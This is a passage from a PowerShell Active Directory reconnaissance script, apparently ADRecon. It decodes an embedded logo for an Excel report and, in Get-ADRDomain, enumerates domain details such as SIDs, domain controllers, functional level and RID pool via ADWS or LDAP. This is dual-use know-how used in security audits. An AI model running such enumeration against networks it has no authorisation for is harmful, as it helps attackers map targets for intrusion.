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iAgHr3UPyAJ8usp/uT7Xv+6/ek5OTl2NnuYN0E8xFaJaxRu107kYVfA1qK0DOypkuAfn1e8N+vqY62vf+E7fxxOJ2d2/8ps7QBK3dtdF1JsCpmjVZxt3BS0ee3zX07NEWehzG4GxtKrK4/exEyspsp95Dey2yeHbXPMEo7pD4MZ/orRpCPkW0j7UPXEH+9c92vrt/wBh9lttlrb2ER3O9UHHjzB4bNGFcPFB48hBHwXUZB4jrZg9zp1x+697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3XugS+SXbdT0L0F3B3TSYSDctV1f19ube0G36mukxkGYl2/jZ69MfNkIqatkoo6ow6TIsUhS99J+nsq3zcW2jZ7ndFQSNbws+kmmrSK0rQ0r60PUi+0XIsXud7n7B7eT3LWcO9brb2bTqgkaITyBDIELIHK1rpLLXhUdav8Au7/hRr31X0s8Wxvj31LtmqdFWCq3Pnt37zSAmORZJDTY2fZIlfylWS7hVCkMGvcQLc+9m7upFpZW0berM7/yGjrsvsX90x7ZW0yvzJzVvl5ADlbeG1tC2RQapBeUFKg4qaggrTNQXyk+b3yU+Y2Xoch3p2HV57E4aokqdu7KxFJTbf2Nt2eSN4XqcbtzGpFTT5IwyvGa6saqrzExjM5jsojbf+a985mkD7tMXjU1VAAsa/MKMV/pNVqYrTrPH2X+7l7Q+wNhLa+221JbX1woWe7lZp7ycAghZJ5CWEdQG8GIRw6gGEeqpIGdV9Xb67q7D2j1X1pt+t3Rvje+apMFt/DUKFnnqqp/3KmqmP7NBi8dTq9RWVcxSnpKWKSaVkjRmBTt9hd7pex7fYoZLuVwqqPU+Z9ABlicAAk4HUk8686cte3fKl/zrzhdR2XLe227TTyucBVGFUcXkkakcUSgvLIyxorOwB+jD8W+iML8ZPj51N0VgpYKun662hj8PkcnTwGmizm5J/Jkt2bhWnYs8Az+566rrBGxZoxMFJNr+81tg2iLYdmttpiIKwRBSRjU3F2/2zkt+fXyce9HuZuHvF7p757lbkrRy7tfvKkbHUYbcUjtoC3A+BbpFFUABtFaCtOh89nHUYde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3RMv5if8A2Qn8tf8AxAvY/wD7zlb7DHOv/Kpbj/zxy/8AHT1kF91H/wASW5G/8Wew/wCr6dfPV2xsreW9q5MZszaW5t3ZKWWOCLH7YwOVz9dJPNq8UKUmKpauoeWXSdKhbtY294Z29rdXT+HaxySP6IpY/sAPX1S7zzFy/wAuWxvOYb6zsLRVLF7iaOBABxJaVlUAeZrQdWZfHX+TV84+/K2iqMr1xJ0bs+Yo9XurucVW1auKC4aRKLYwp6nfVXXNCCYVmoKWldrB6iIHUB3svtjzXvDgyQfSWx4vPVD+UdDIT6VUD1YdYe+7H94F92/2wt5IrHdxzJv61C2206blSfIveals1SvxFZpJAKlYnIodrj4K/wAtnof4KYWpqtnpVb57XztAuP3X25uakpoM3W0ReGabC7axUElTS7Q2zLVQLK1LFLPUTuqfc1NR4ofHkLylyPtHKURa2rLuLijzMBqI/hUZCLXNASTjUzUFOIn3lfvd+5n3ldxSHfym28kW0uu22y3ZjCj0IE1xIQrXVwFJUSMqIgLeDDFrk12G+xn1ir1737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+691737r3Xvfuvde9+690n91f8AHu5b/qFP/Q6e2Z/7Fvs6M9m/5KkH+n6UHt7os697917r3v3Xuve/de697917r3v3Xuve/de697917r3v3Xuv/9k="

        $bytes = [System.Convert]::FromBase64String($base64sos)
        Remove-Variable base64sos

        $CompanyLogo = -join($ReportPath,'\','SOS_Logo.jpg')
		$p = New-Object IO.MemoryStream($bytes, 0, $bytes.length)
		$p.Write($bytes, 0, $bytes.length)
        Add-Type -AssemblyName System.Drawing
		$picture = [System.Drawing.Image]::FromStream($p, $true)
		$picture.Save($CompanyLogo)

        Remove-Variable bytes
        Remove-Variable p
        Remove-Variable picture

        $LinkToFile = $false
        $SaveWithDocument = $true
        $Left = 0
        $Top = 0
        $Width = 135
        $Height = 50


        $worksheet.Shapes.AddPicture($CompanyLogo, $LinkToFile, $SaveWithDocument, $Left, $Top, $Width, $Height) | Out-Null

        Remove-Variable LinkToFile
        Remove-Variable SaveWithDocument
        Remove-Variable Left
        Remove-Variable Top
        Remove-Variable Width
        Remove-Variable Height

        If (Test-Path -Path $CompanyLogo)
        {
            Remove-Item $CompanyLogo
        }
        Remove-Variable CompanyLogo

        $row = 5
        $column = 1
        $worksheet.Cells.Item($row,$column)= "Table of Contents"
        $worksheet.Cells.Item($row,$column).Style = "Heading 2"
        $row++

        For($i=2; $i -le $workbook.Worksheets.Count; $i++)
        {
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item($row,$column) , "" , "'$($workbook.Worksheets.Item($i).Name)'!A1", "", $workbook.Worksheets.Item($i).Name) | Out-Null
            $row++
        }

        $row++
        $worksheet.Cells.Item($row, 1) = "© Sense of Security 2018"
        $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item($row,2) , "https://www.senseofsecurity.com.au", "" , "", "www.senseofsecurity.com.au") | Out-Null

        $worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null

        $excel.Windows.Item(1).Displaygridlines = $false
        $excel.ScreenUpdating = $true
        $ADStatFileName = -join($ExcelPath,'\',$DomainName,'ADRecon-Report.xlsx')
        Try
        {

            $excel.DisplayAlerts = $False
            $workbook.SaveAs($ADStatFileName)
            Write-Output "[+] Excelsheet Saved to: $ADStatFileName"
        }
        Catch
        {
            Write-Error "[EXCEPTION] $($_.Exception.Message)"
        }
        $excel.Quit()
        Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet -Final $true
        Remove-Variable worksheet
        Get-ADRExcelComObjRelease -ComObjtoRelease $workbook -Final $true
        Remove-Variable -Name workbook -Scope Global
        Get-ADRExcelComObjRelease -ComObjtoRelease $excel -Final $true
        Remove-Variable -Name excel -Scope Global
    }
}

Function Get-ADRDomain
{

    param(
        [Parameter(Mandatory = $true)]
        [string] $Protocol,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomain,

        [Parameter(Mandatory = $false)]
        [DirectoryServices.DirectoryEntry] $objDomainRootDSE,

        [Parameter(Mandatory = $false)]
        [string] $DomainController,

        [Parameter(Mandatory = $false)]
        [Management.Automation.PSCredential] $Credential = [Management.Automation.PSCredential]::Empty
    )

    If ($Protocol -eq 'ADWS')
    {
        Try
        {
            $ADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning "[Get-ADRDomain] Error getting Domain Context"
            Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            Return $null
        }
        If ($ADDomain)
        {
            $DomainObj = @()


            $FLAD = @{
	            0 = "Windows2000";
	            1 = "Windows2003/Interim";
	            2 = "Windows2003";
	            3 = "Windows2008";
	            4 = "Windows2008R2";
	            5 = "Windows2012";
	            6 = "Windows2012R2";
	            7 = "Windows2016"
            }
            $DomainMode = $FLAD[[convert]::ToInt32($ADDomain.DomainMode)] + "Domain"
            Remove-Variable FLAD
            If (-Not $DomainMode)
            {
                $DomainMode = $ADDomain.DomainMode
            }

            $ObjValues = @("Name", $ADDomain.DNSRoot, "NetBIOS", $ADDomain.NetBIOSName, "Functional Level", $DomainMode, "DomainSID", $ADDomain.DomainSID.Value)

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value $ObjValues[$i]
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ObjValues[$i+1]
                $i++
                $DomainObj += $Obj
            }
            Remove-Variable DomainMode

            For($i=0; $i -lt $ADDomain.ReplicaDirectoryServers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Domain Controller"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADDomain.ReplicaDirectoryServers[$i]
                $DomainObj += $Obj
            }
            For($i=0; $i -lt $ADDomain.ReadOnlyReplicaDirectoryServers.Count; $i++)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Read Only Domain Controller"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $ADDomain.ReadOnlyReplicaDirectoryServers[$i]
                $DomainObj += $Obj
            }

            Try
            {
                $ADForest = Get-ADForest $ADDomain.Forest
            }
            Catch
            {
                Write-Verbose "[Get-ADRDomain] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }

            If (-Not $ADForest)
            {
                Try
                {
                    $ADForest = Get-ADForest -Server $DomainController
                }
                Catch
                {
                    Write-Warning "[Get-ADRDomain] Error getting Forest Context"
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                }
            }
            If ($ADForest)
            {
                $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.Name)))" -Properties whenCreated
                If (-Not $DomainCreation)
                {
                    $DomainCreation = Get-ADObject -SearchBase "$($ADForest.PartitionsContainer)" -LDAPFilter "(&(objectClass=crossRef)(systemFlags=3)(Name=$($ADDomain.NetBIOSName)))" -Properties whenCreated
                }
                Remove-Variable ADForest
            }

            Try
            {
                $RIDManager = Get-ADObject -Identity "CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName)" -Properties rIDAvailablePool
                $RIDproperty = $RIDManager.rIDAvailablePool
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable RIDManager
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($ADDomain.DistinguishedName)"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            If ($DomainCreation)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "Creation Date"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $DomainCreation.whenCreated
                $DomainObj += $Obj
                Remove-Variable DomainCreation
            }

            $Obj = New-Object PSObject
            $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "ms-DS-MachineAccountQuota"
            $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $((Get-ADObject -Identity ($ADDomain.DistinguishedName) -Properties ms-DS-MachineAccountQuota).'ms-DS-MachineAccountQuota')
            $DomainObj += $Obj

            If ($RIDsIssued)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "RIDs Issued"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $RIDsIssued
                $DomainObj += $Obj
                Remove-Variable RIDsIssued
            }
            If ($RIDsRemaining)
            {
                $Obj = New-Object PSObject
                $Obj | Add-Member -MemberType NoteProperty -Name "Category" -Value "RIDs Remaining"
                $Obj | Add-Member -MemberType NoteProperty -Name "Value" -Value $RIDsRemaining
                $DomainObj += $Obj
                Remove-Variable RIDsRemaining
            }
        }
    }

    If ($Protocol -eq 'LDAP')
    {
        If ($Credential -ne [Management.Automation.PSCredential]::Empty)
        {
            $DomainFQDN = Get-DNtoFQDN($objDomain.distinguishedName)
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain",$($DomainFQDN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
            Try
            {
                $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error getting Domain Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                Return $null
            }
            Remove-Variable DomainContext

            Try
            {
                $SearchPath = "CN=RID Manager$,CN=System"
                $objSearchPath = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$($DomainController)/$SearchPath,$($objDomain.distinguishedName)", $Credential.UserName,$Credential.GetNetworkCredential().Password
                $objSearcherPath = New-Object System.DirectoryServices.DirectorySearcher $objSearchPath
                $objSearcherPath.PropertiesToLoad.AddRange(("ridavailablepool"))
                $objSearcherResult = $objSearcherPath.FindAll()
                $RIDproperty = $objSearcherResult.Properties.ridavailablepool
                [int32] $totalSIDS = $($RIDproperty) / ([math]::Pow(2,32))
                [int64] $temp64val = $totalSIDS * ([math]::Pow(2,32))
                $RIDsIssued = [int32]($($RIDproperty) - $temp64val)
                $RIDsRemaining = $totalSIDS - $RIDsIssued
                Remove-Variable SearchPath
                $objSearchPath.Dispose()
                $objSearcherPath.Dispose()
                $objSearcherResult.Dispose()
                Remove-Variable RIDproperty
                Remove-Variable totalSIDS
                Remove-Variable temp64val
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error accessing CN=RID Manager$,CN=System,$($SearchPath),$($objDomain.distinguishedName)"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            Try
            {
                $ForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("Forest",$($ADDomain.Forest),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetForest($ForestContext)
            }
            Catch
            {
                Write-Warning "[Get-ADRDomain] Error getting Forest Context"
                Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
            }
            If ($ForestContext)
            {
                Remove-Variable ForestContext
            }
            If ($ADForest)
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
            }
            If ($GlobalCatalog)
            {
                $DN = "GC://$($GlobalCatalog.IPAddress)/$($objDomain.distinguishedname)"
                Try
                {
                    $ADObject = New-Object -TypeName System.DirectoryServices.DirectoryEntry -ArgumentList ($($DN),$($Credential.UserName),$($Credential.GetNetworkCredential().password))
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($ADObject.objectSid[0], 0)
                    $ADObject.Dispose()
                }
                Catch
                {
                    Write-Warning "[Get-ADRDomain] Error retrieving Domain SID using the GlobalCatalog $($GlobalCatalog.IPAddress). Using SID from the ObjDomain."
                    Write-Verbose "[EXCEPTION] $($_.Exception.Message)"
                    $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
                }
            }
            Else
            {
                $ADDomainSID = New-Object System.Security.Principal.SecurityIdentifier($objDomain.objectSid[0], 0)
            }
        }
        Else
        {
            $ADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $ADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            Try
            {
                $GlobalCatalog = $ADForest.FindGlobalCatalog()
